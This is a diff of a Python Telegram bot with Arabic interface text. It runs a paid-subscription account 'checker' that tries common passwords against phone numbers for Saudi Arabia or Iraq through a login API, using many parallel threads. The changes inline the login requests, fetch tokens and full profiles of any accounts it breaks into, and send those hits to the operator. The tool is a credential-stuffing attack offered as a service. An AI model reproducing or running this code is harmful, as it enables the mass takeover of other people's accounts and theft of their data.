-# === لوحات المفاتيح والأزرار المرتبطة بحالة المستخدم ===
-
+# === لوحات التحكم ===
 def get_control_keyboard(user_id: int):
     session = get_user_session(user_id)
-    running = session["is_running"]
     markup = types.InlineKeyboardMarkup(row_width=1)
-    if not running:
+    if not session["is_running"]:
         markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
@@ -452,16 +376,15 @@ def get_control_keyboard(user_id: int):
         types.InlineKeyboardButton("➕ تفعيل مشترك", callback_data="add_subscriber"),
         types.InlineKeyboardButton("➖ حذف مشترك", callback_data="del_subscriber"),
         types.InlineKeyboardButton("📋 عرض المشتركين", callback_data="list_subscribers"),
-        types.InlineKeyboardButton("📢 إذاعة إلى المشتركين", callback_data="broadcast_msg"),
+        types.InlineKeyboardButton("📢 إذاعة للمشتركين", callback_data="broadcast_msg"),
         types.InlineKeyboardButton(f"⚙️ سرعة الفحص (الثريدز): {scan_threads}", callback_data="set_threads")
     )
     return markup
 
 def get_user_keyboard(user_id: int):
     session = get_user_session(user_id)
-    running = session["is_running"]
     markup = types.InlineKeyboardMarkup(row_width=1)
-    if not running:
+    if not session["is_running"]:
         markup.add(types.InlineKeyboardButton("▶ بدء الفحص", callback_data="start_check"))
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
@@ -481,7 +404,7 @@ def start_command(message):
     user_id = message.from_user.id
     session = get_user_session(user_id)
     if user_id == ADMIN_ID:
-        bot.reply_to(message, "أهلاً بك يا مطور البوت 👨‍💻\nاستخدم الأمر /admin لوحة التحكم.")
+        bot.reply_to(message, "أهلاً بك يا مطور البوت 👨‍💻\nاستخدم الأمر /admin للتحكم.")
         return
     
     if check_subscription(user_id):
@@ -503,14 +426,13 @@ def start_command(message):
 @bot.message_handler(commands=['admin'])
 def admin_command(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ عذراً، هذا الأمر مخصص للمطور فقط.")
+        bot.reply_to(message, "❌ عذراً، هذا الأمر للمطور فقط.")
         return
-    
     user_id = message.from_user.id
     session = get_user_session(user_id)
     country_label = get_country_name_label(session["current_country"])
     text = (
-        "🎛 <b>قسم التفعيلات (لوحة التحكم بالمطور)</b>\n\n"
+        "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
         f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
         f"دولة الفحص الحالية: <b>{country_label}</b>\n"
         f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
@@ -532,7 +454,6 @@ def callback_handler(call):
         if session["is_running"]:
             bot.answer_callback_query(call.id, "⚠️ الفحص يعمل لديك بالفعل!")
             return
-        
         bot.answer_callback_query(call.id)
         bot.edit_message_text(
             "🌐 <b>اختر دولة الفحص المطلوبة:</b>",
@@ -543,10 +464,7 @@ def callback_handler(call):
         )
 
     elif call.data.startswith("select_country_"):
-        code_map = {
-            "select_country_sa": "SA",
-            "select_country_iq": "IQ"
-        }
+        code_map = {"select_country_sa": "SA", "select_country_iq": "IQ"}
         session["current_country"] = code_map.get(call.data, "SA")
         country_name = get_country_name_label(session["current_country"])
 
@@ -561,15 +479,13 @@ def callback_handler(call):
         session["error_count"] = 0
         session["tried"].clear()
 
-        # بدء خيط فحص خاص بهذا المستخدم فقط
         t = threading.Thread(target=run_checker_loop, args=(call.message.chat.id, user_id, call.message.message_id))
         t.daemon = True
         t.start()
         session["thread"] = t
 
         bot.answer_callback_query(call.id, f"✅ تم بدء الفحص لدولة {country_name}")
-        
-        active_markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
+        markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
         bot.edit_message_text(
             f"🚀 <b>جاري فحص حسابات دولة {country_name} الآن...</b>\n\n"
             f"✅ صيد (Valid): {session['valid_count']}\n"
@@ -578,27 +494,19 @@ def callback_handler(call):
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
             parse_mode="HTML",
-            reply_markup=active_markup
+            reply_markup=markup
         )
 
-    elif call.data == "back_to_admin":
-        if not is_admin:
-            return
+    elif call.data == "back_to_admin" and is_admin:
         country_label = get_country_name_label(session["current_country"])
         text = (
-            "🎛 <b>قسم التفعيلات (لوحة التحكم)</b>\n\n"
+            "🎛 <b>لوحة تحكم المطور الرئيسية</b>\n\n"
             f"حالة الفحص لديك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n"
             f"دولة الفحص الحالية: <b>{country_label}</b>\n"
             f"سرعة الفحص العامة: <b>{scan_threads} ثريد</b>\n\n"
             "اختر أحد خيارات الإدارة أدناه:"
         )
-        bot.edit_message_text(
-            text,
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="HTML",
-            reply_markup=get_control_keyboard(user_id)
-        )
+        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_control_keyboard(user_id))
 
     elif call.data == "back_to_user":
         expiry = subscribers.get(user_id, 0)
@@ -612,24 +520,15 @@ def callback_handler(call):
             f"حالة الفحص الخاص بك: <b>{'يعمل 🚀' if session['is_running'] else 'متوقف 🛑'}</b>\n\n"
             "تحكم بالفحص عبر الأزرار أدناه:"
         )
-        bot.edit_message_text(
-            text,
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="HTML",
-            reply_markup=get_user_keyboard(user_id)
-        )
+        bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=get_user_keyboard(user_id))
 
     elif call.data == "stop_check":
         if not session["is_running"]:
             bot.answer_callback_query(call.id, "⚠️ الفحص متوقف لديك مسبقاً!")
             return
-
         session["is_running"] = False
         session["stop_event"].set()
-
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
-        
         country_name = get_country_name_label(session["current_country"])
         main_text = (
             f"🌐 <b>لوحة الفحص (متوقف 🛑)</b>\n"
@@ -640,120 +539,80 @@ def callback_handler(call):
             f"⚠️ أخطاء اتصال (Errors): {session['error_count']}\n\n"
             "اختر أحد الخيارات أدناه:"
         )
-        active_markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
-        bot.edit_message_text(
-            main_text,
-            chat_id=call.message.chat.id,
-            message_id=call.message.message_id,
-            parse_mode="HTML",
-            reply_markup=active_markup
-        )
+        markup = get_control_keyboard(user_id) if is_admin else get_user_keyboard(user_id)
+        bot.edit_message_text(main_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML", reply_markup=markup)
 
-    elif call.data in ["add_subscriber", "del_subscriber", "list_subscribers", "broadcast_msg", "set_threads"]:
-        if not is_admin:
-            bot.answer_callback_query(call.id, "❌ هذا الزر مخصص للمطور فقط!", show_alert=True)
-            return
-
+    elif call.data in ["add_subscriber", "del_subscriber", "list_subscribers", "broadcast_msg", "set_threads"] and is_admin:
         if call.data == "add_subscriber":
             user_states[user_id] = "add_subscriber"
             bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص وعدد الأيام بالتنسيق التالي:\nمثال: <code>123456789 30</code>", parse_mode="HTML")
-
+            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص وعدد الأيام بالتنسيق:\nمثال: <code>123456789 30</code>", parse_mode="HTML")
         elif call.data == "del_subscriber":
             user_states[user_id] = "del_subscriber"
             bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص المراد حذفه من المشتركين:")
-
+            bot.send_message(call.message.chat.id, "أرسل ايدي الشخص المراد حذفه:")
         elif call.data == "list_subscribers":
             bot.answer_callback_query(call.id)
             if not subscribers:
-                bot.send_message(call.message.chat.id, "📋 لا يوجد مشتركين مسجلين حالياً.")
+                bot.send_message(call.message.chat.id, "📋 لا يوجد مشتركين حالياً.")
             else:
                 now = time.time()
                 subs_text = "📋 <b>قائمة المشتركين:</b>\n\n"
                 for sub_id, expiry in list(subscribers.items()):
-                    if now > expiry:
-                        status = "منتهي ❌"
-                    else:
-                        rem_days = int((expiry - now) / 86400)
-                        status = f"نشط ✅ (يتبقى {rem_days} يوم)"
+                    status = "منتهي ❌" if now > expiry else f"نشط ✅ (باقي {int((expiry - now)/86400)} يوم)"
                     subs_text += f"• <code>{sub_id}</code> — {status}\n"
                 bot.send_message(call.message.chat.id, subs_text, parse_mode="HTML")
-
         elif call.data == "broadcast_msg":
             user_states[user_id] = "broadcast"
             bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, "📢 أرسل رسالة الإذاعة المراد إرسالها لجميع المشتركين:")
-
+            bot.send_message(call.message.chat.id, "📢 أرسل رسالة الإذاعة لكل المشتركين:")
         elif call.data == "set_threads":
             user_states[user_id] = "set_threads"
             bot.answer_callback_query(call.id)
-            bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code> ثريد.\n\nأرسل عدد الثريدز الجديد (رقم صحيح بين 1 و 100):", parse_mode="HTML")
+            bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code>\nأرسل عدد الثريدز الجديد (1 إلى 100):", parse_mode="HTML")
 
 @bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.from_user.id in user_states)
 def handle_admin_input(message):
     global scan_threads
     action = user_states.pop(message.from_user.id, None)
-    
     if action == "add_subscriber":
-        text = message.text.strip()
-        parts = text.split()
+        parts = message.text.strip().split()
         if parts and parts[0].isdigit():
             sub_id = int(parts[0])
-            days = 30
-            if len(parts) > 1 and parts[1].isdigit():
-                days = int(parts[1])
-            
-            expiry_time = time.time() + (days * 24 * 3600)
-            subscribers[sub_id] = expiry_time
-            
-            bot.reply_to(message, f"✅ تم تفعيل المشترك بنجاح:\n🆔 الآيدي: <code>{sub_id}</code>\n⏳ المدة: {days} يوم", parse_mode="HTML")
+            days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 30
+            subscribers[sub_id] = time.time() + (days * 86400)
+            bot.reply_to(message, f"✅ تم تفعيل المشترك <code>{sub_id}</code> لمدة {days} يوم.", parse_mode="HTML")
             try:
-                bot.send_message(sub_id, f"🎉 <b>مبروك! تم تفعيل اشتراكك في بوت الفحص لمدة {days} يوم.</b>\nأرسل /start لفتح لوحة التحكم وبدء الفحص.", parse_mode="HTML")
+                bot.send_message(sub_id, f"🎉 <b>مبروك! تم تفعيل اشتراكك لمدة {days} يوم.</b>\nأرسل /start للبدء.", parse_mode="HTML")
             except Exception:
                 pass
         else:
-            bot.reply_to(message, "❌ الآيدي المدخل غير صحيح. مثال:\n<code>123456789 30</code>", parse_mode="HTML")
-
+            bot.reply_to(message, "❌ تنسيق خاطئ. مثال: <code>123456789 30</code>", parse_mode="HTML")
     elif action == "del_subscriber":
         text = message.text.strip()
-        if text.isdigit():
-            sub_id = int(text)
-            if sub_id in subscribers:
-                del subscribers[sub_id]
-                bot.reply_to(message, f"🗑 تم حذف المشترك <code>{sub_id}</code> بنجاح.", parse_mode="HTML")
-            else:
-                bot.reply_to(message, "⚠️ هذا الآيدي غير موجود في قائمة المشتركين.")
+        if text.isdigit() and int(text) in subscribers:
+            del subscribers[int(text)]
+            bot.reply_to(message, f"🗑 تم حذف المشترك بنجاح.")
         else:
-            bot.reply_to(message, "❌ يرجى إرسال آيدي صحيح بالأرقام للحذف.")
-
+            bot.reply_to(message, "⚠️ الآيدي غير موجود.")
     elif action == "broadcast":
-        msg_text = message.text
-        success = 0
-        failed = 0
+        success, failed = 0, 0
         for sub_id in subscribers:
             try:
-                bot.send_message(sub_id, f"📢 <b>إذاعة جديدة:</b>\n\n{msg_text}", parse_mode="HTML")
+                bot.send_message(sub_id, f"📢 <b>إذاعة عامة:</b>\n\n{message.text}", parse_mode="HTML")
                 success += 1
             except Exception:
                 failed += 1
-        bot.reply_to(message, f"📢 <b>تم الانتهاء من الإذاعة:</b>\n✅ تم الإرسال بنجاح إلى: {success}\n❌ فشل الإرسال إلى: {failed}", parse_mode="HTML")
-
+        bot.reply_to(message, f"📢 تم الإرسال بنجاح إلى: {success} | فشل: {failed}")
     elif action == "set_threads":
-        text = message.text.strip()
-        if text.isdigit():
-            val = int(text)
-            if 1 <= val <= 100:
-                scan_threads = val
-                bot.reply_to(message, f"⚙️ تم تحديث سرعة الفحص (الثريدز) بنجاح إلى: <code>{scan_threads}</code>", parse_mode="HTML")
-            else:
-                bot.reply_to(message, "⚠️ يرجى إدخال رقم بين 1 و 100.")
+        if message.text.strip().isdigit() and 1 <= int(message.text.strip()) <= 100:
+            scan_threads = int(message.text.strip())
+            bot.reply_to(message, f"⚙️ تم تحديث الثريدز إلى: <code>{scan_threads}</code>", parse_mode="HTML")
         else:
-            bot.reply_to(message, "❌ يرجى إرسال رقم صحيح فقط.")
+            bot.reply_to(message, "⚠️ أرسل رقماً صحيحاً بين 1 و 100.")
 
 def run_checker_loop(chat_id, user_id, msg_id):
     session = get_user_session(user_id)
-    max_threads = scan_threads
     passwords = [
         'Aa123123123', 'Aa12312300', 'Aa10002000', 'Aa100200300',
         'Aa100200', 'Aa10203040', 'Aa102030', 'As123123',
@@ -772,28 +631,44 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 session["tried"].add(mobile)
 
             password = random.choice(passwords)
-            area_code = get_country_area_code(country)
-            res = login(mobile, password, area_code=area_code, country=country, timeout=TIMEOUT, server=SERVER, fetch_gems=True)
+            password_hashed = md5upper(password)
+            body = build_payload(mobile, password_hashed, country=country)
+            headers, wire, hera = body
+
+            try:
+                response = requests.post(api_url, data=wire, headers=headers, timeout=15)
+                result = decode_resp(response.json(), hera)
+            except Exception:
+                with session["stats_lock"]:
+                    session["error_count"] += 1
+                continue
 
             with session["stats_lock"]:
                 if not session["is_running"] or session["stop_event"].is_set():
                     break
-                if res["success"]:
+                if result.get('status') == 0:
                     session["valid_count"] += 1
-                    prof = res.get("profile")
-                    txt = _tg_text(res["data"], mobile, password, profile=prof)
+                    data = result.get('data') or {}
+                    token = data.get('token', '')
+                    uid = str(data.get('id') or data.get('showNumId') or '')
+                    
+                    # جلب المعلومات الكاملة للحساب المصيد
+                    prof = fetch_profile(token, uid, data)
+                    hit_msg = format_hit_message(data, mobile, password, country, prof)
+                    
                     try:
-                        bot.send_message(chat_id, txt, parse_mode="HTML")
+                        bot.send_message(chat_id, hit_msg, parse_mode="HTML")
                     except Exception:
                         pass
                 else:
-                    if "error" in res or res.get("http"):
-                        session["error_count"] += 1
-                    else:
+                    if result.get('status') is not None:
                         session["wrong_count"] += 1
+                    else:
+                        session["error_count"] += 1
 
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
-        futures = [executor.submit(worker) for _ in range(max_threads)]
+    with ThreadPoolExecutor(max_workers=scan_threads) as executor:
+        for _ in range(scan_threads):
+            executor.submit(worker)
         
         while session["is_running"] and not session["stop_event"].is_set():
             for _ in range(30):
@@ -813,21 +688,12 @@ def run_checker_loop(chat_id, user_id, msg_id):
                     f"⚠️ أخطاء اتصال (Errors): {session['error_count']}"
                 )
             
-            if not session["is_running"] or session["stop_event"].is_set():
-                break
-                
             try:
-                active_markup = get_control_keyboard(user_id) if user_id == ADMIN_ID else get_user_keyboard(user_id)
-                bot.edit_message_text(
-                    status_text,
-                    chat_id=chat_id,
-                    message_id=msg_id,
-                    parse_mode="HTML",
-                    reply_markup=active_markup
-                )
+                markup = get_control_keyboard(user_id) if user_id == ADMIN_ID else get_user_keyboard(user_id)
+                bot.edit_message_text(status_text, chat_id=chat_id, message_id=msg_id, parse_mode="HTML", reply_markup=markup)
             except Exception:
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running and waiting for commands with isolated user sessions...")
+    print("🤖 Bot is running with isolated user sessions & advanced profile fetching...")
     bot.infinity_polling()
